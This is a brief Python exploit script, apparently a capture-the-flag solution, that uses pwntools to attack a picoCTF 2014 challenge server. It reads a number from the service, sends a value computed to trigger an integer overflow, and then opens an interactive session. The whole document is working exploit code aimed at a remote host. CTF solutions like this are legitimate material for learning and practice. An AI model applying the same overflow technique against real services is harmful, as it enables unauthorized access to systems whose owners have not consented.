#!/usr/bin/env python

from pwn import *

# integer overflow

r = remote('vuln2014.picoctf.com', 50000)
number = int(r.recvline().strip().split(' ')[3][:-1])
log.info('Got number: ' + str(number))

payload = str(2**31 + 1 - number)
log.info('Sending payload: ' + payload)

r.sendline(payload)

r.interactive()